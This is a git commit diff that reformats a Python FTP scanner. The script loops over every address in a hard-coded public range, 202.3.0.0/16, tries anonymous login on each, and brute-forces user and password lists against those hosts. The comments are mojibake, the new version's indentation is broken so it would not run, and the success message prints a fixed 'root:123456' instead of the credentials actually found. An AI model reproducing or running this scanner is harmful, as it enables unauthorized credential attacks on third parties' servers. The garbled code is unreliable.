03f50878142c7f4cd474607cadba5760960035b8
mmiracle <1169706430@qq.com>
2019-04-23 16:35:44 +0800

    lxm

--- ftp.py
+++ ftp.py
@@ -2,80 +2,88 @@
 from ftplib import *
 import argparse
 import time
-def anonScan(hostName):      # ²ÎÊýÊÇÖ÷»úÃû
-	try:
-		with FTP(hostName) as ftp: # ´´½¨FTP¶ÔÏó
-			ftp.login()      # FTPÄäÃûµÇÂ½
-			print("\n[*]" + str(hostName) + " FTP Anonymous login successful!")
-			return True
-	except Exception as e:   # Å×³öÒì³£±íÊ¾ÄäÃûµÇÂ½Ê§°Ü
-		if str(e).find("invalid") > 0 or str(e).find("failed") > 0:
-			return False;
-			pass;
-		else:
-			print("cannot connect to: " + hostName);
-			return False;
+
+
+def anonScan(hostName):      # ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+    try:
+        with FTP(hostName) as ftp:  # ï¿½ï¿½ï¿½ï¿½FTPï¿½ï¿½ï¿½ï¿½
+            ftp.login()      # FTPï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â½
+            print("\n[*]" + str(hostName) + " FTP Anonymous login successful!")
+            return True
+    except Exception as e:   # ï¿½×³ï¿½ï¿½ì³£ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â½Ê§ï¿½ï¿½
+        if str(e).find("invalid") > 0 or str(e).find("failed") > 0:
+            return False
+            pass
+        else:
+            print("cannot connect to: " + hostName)
+            return False
+
 
 def vlcLogin(hostName, pwd):        # Parameters (hostname, dictionary file)
-	try:
-		with open("user.txt", 'r') as uf:
-			for userLine in uf.readlines():
-				try:
-					with open(pwd, 'r') as pf:     # Open dictionary file
-						for pwdLine in pf.readlines():
-							userName = userLine.strip('\r').strip('\n')
-							passWord = pwdLine.strip('\r').strip('\n')
-							print('[+] Trying: ' + userName + ':' + passWord )
-							try:
-								with FTP(hostName) as ftp:
-									ftp.login(userName, passWord)
-									print('\n[+] ' + str(hostName) + ' FTP Login successful: '+ "root" + ':' + "123456")
-									return (userName, passWord)
-							except Exception as e:
-								if str(e).find("invalid") > 0 or str(e).find("failed") > 0:
-									pass;
-								else:
-									print("cannot connect to: " + hostName);
-									return (None,None)
-				except IOError as e:
-					print('Error: the password file does not exist!')
-	except IOError as e:
-		print('Error: the username file does not exist!')
-	return (None,None)
+    try:
+        with open("user.txt", 'r') as uf:
+            for userLine in uf.readlines():
+                try:
+                    with open(pwd, 'r') as pf:     # Open dictionary file
+                        for pwdLine in pf.readlines():
+                        userName = userLine.strip('\r').strip('\n')
+                         passWord = pwdLine.strip('\r').strip('\n')
+                          print('[+] Trying: ' + userName + ':' + passWord)
+                           try:
+                                with FTP(hostName) as ftp:
+                                    ftp.login(userName, passWord)
+                                    	print('\n[+] ' + str(hostName) +
+											' FTP Login successful: ' + "root" + ':' + "123456")
+                                    	return (userName, passWord)
+                            except Exception as e:
+                                if str(e).find("invalid") > 0 or str(e).find("failed") > 0:
+                                    pass
+                                else:
+                                    print("cannot connect to: " + hostName)
+                                    return (None, None)
+                except IOError as e:
+                    print('Error: the password file does not exist!')
+    except IOError as e:
+        print('Error: the username file does not exist!')
+    return (None, None)
+
 
 def main():
-	parser = argparse.ArgumentParser(description='FTP Scanner')
-	parser.add_argument('-H', dest='hostname', help='The host list with ","space')
-	parser.add_argument('-f', dest='pwdFile', help='Password dictionary file')
-	weakScanner = None
-	try:
-		weakScanner = parser.parse_args()
-	except:
-		print(parser.parse_args(['-h']))
-		exit(0)
-		
-	hostNames = str(weakScanner.hostname).split(',')
-	print(weakScanner)
-	pwdFile = weakScanner.pwdFile
-	if hostNames == ['None']:
-		print(parser.parse_args(['-h']))
-		exit(0)
-	
-	for ip1 in range(202,203):
-		for ip2 in range(3,4):
-			for ip3 in range(0,255):
-				for ip4 in range(0,255):					
-					userName = None;
-					password = None;
-					hostName = str(ip1) + "." + str(ip2) + "." + str(ip3) + "." + str(ip4);
-					if anonScan(hostName) == True:
-						print('Host: ' + hostName+ ' Can anonymously!')
-					elif pwdFile != None:
-						(userName,password) = vlcLogin(hostName,pwdFile)
-						if password != None:
-							print('\n[+] Host: ' + hostName + 'Username: ' + userName + 'Password: ' + password)
-	print('\n[*]-------------------Scan End!--------------------[*]')
+    parser = argparse.ArgumentParser(description='FTP Scanner')
+    parser.add_argument('-H', dest='hostname',
+                        help='The host list with ","space')
+    parser.add_argument('-f', dest='pwdFile', help='Password dictionary file')
+    weakScanner = None
+    try:
+        weakScanner = parser.parse_args()
+    except:
+        print(parser.parse_args(['-h']))
+        exit(0)
+
+    hostNames = str(weakScanner.hostname).split(',')
+    print(weakScanner)
+    pwdFile = weakScanner.pwdFile
+    if hostNames == ['None']:
+        print(parser.parse_args(['-h']))
+        exit(0)
+
+    for ip1 in range(202, 203):
+        for ip2 in range(3, 4):
+            for ip3 in range(0, 255):
+                for ip4 in range(0, 255):
+                    userName = None
+                    password = None
+                    hostName = str(ip1) + "." + str(ip2) + \
+                        "." + str(ip3) + "." + str(ip4)
+                    if anonScan(hostName) == True:
+                        print('Host: ' + hostName + ' Can anonymously!')
+                    elif pwdFile != None:
+                        (userName, password) = vlcLogin(hostName, pwdFile)
+                        if password != None:
+                            print('\n[+] Host: ' + hostName + 'Username: ' +
+                                  userName + 'Password: ' + password)
+    print('\n[*]-------------------Scan End!--------------------[*]')
 
 
 if __name__ == '__main__':
-	main()
+    main()
